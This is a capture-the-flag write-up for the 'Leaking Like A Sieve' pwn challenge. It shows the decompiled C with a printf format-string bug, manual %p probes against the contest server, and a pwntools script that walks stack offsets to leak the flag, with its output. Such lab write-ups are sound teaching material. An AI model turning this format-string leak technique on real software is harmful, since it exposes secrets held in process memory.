# Leaking Like A Sieve
**Category: Pwn**

The binary's implementation can be seen in Ghidra:

```c
void main(void)

{
  FILE *__stream;
  long in_FS_OFFSET;
  char local_58 [32];
  char local_38 [40];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  buffer_init();
  __stream = fopen("./flag.txt","r");
  if (__stream == (FILE *)0x0) {
    puts(
        "The flag file isn\'t loading. Please contact an organiser if you are running this on theshell server."
        );
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fgets(local_38,0x20,__stream);
  do {
    puts("What is your name?");
    fgets(local_58,0x20,stdin);
    printf("\nHello there, ");
    printf(local_58);
    putchar(10);
  } while( true );
}
```

The flag is loaded into a variable, `local_38`. The program repeatedly prompts for a name, which gets printed back to us using `printf`. This looks like a classic format string vulnerability.

By setting our name to the `%p` format string specifier, we can read the values the stack is pointing to. For example: 

```
$ nc pwn-2021.duc.tf 31918
What is your name?
%p %p %p %p %p

Hello there, 0x7fffce77f640 0x7f53b3d3f8c0 (nil) 0xe 0x7f53b3f6b4c0
```

We can also use the offset notation to read the values at a specific offset:

```
$ nc pwn-2021.duc.tf 31918
What is your name?
%4$p

Hello there, 0xe
```

This program will loop through 20 offsets, and attempt to convert the hex it receives into text. All the readable text gets concatenated into our answer:

```python
#!/usr/bin/env python3

from pwn import *
import re

context.binary = ELF('./hellothere')

if args.REMOTE:
    io = remote('pwn-2021.duc.tf', 31918)
else:
    io = process(context.binary.path)

result = ''
for i in range(20):
    log.info(io.recvuntilS('?'))
    io.sendline(f'%{i}$p'.encode())
    io.recvlines(2)
    response = io.recvlineS()
    log.info(response)
    data = re.search(', (.*)', response).groups()[0][2:]
    try:
        # Attempt to convert the response from hex into text
        text = bytearray.fromhex(data).decode()
        result += text[::-1] # Reverse the string to account for endianness
    except:
        # Ignore anything pointed to by the stack that can't be read as text
        pass

print(result)
io.close()
```
```
$ ./exploit.py REMOTE
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to pwn-2021.duc.tf on port 31918: Done
[*] What is your name?
[*] Hello there, %0$p
[*]
    What is your name?
[*] Hello there, 0x7ffc93b21170
[*]
    What is your name?
[*] Hello there, 0x7f9aec5708c0
[*]
    What is your name?
[*] Hello there, (nil)
[*]
    What is your name?
[*] Hello there, 0xe
[*]
    What is your name?
[*] Hello there, 0x7f9aec79c4c0
... < snipped >
    What is your name?
[*] Hello there, 0xf53e0ab6bdf6d900
[*]
    What is your name?
[*] Hello there, 0x55abd74132a0
[*]
    What is your name?
[*] Hello there, 0x7f9aec1a4bf7
DUCTF{f0rm4t_5p3c1f13r_m3dsg!}
[*] Closed connection to pwn-2021.duc.tf port 31918
```

`DUCTF{f0rm4t_5p3c1f13r_m3dsg!}`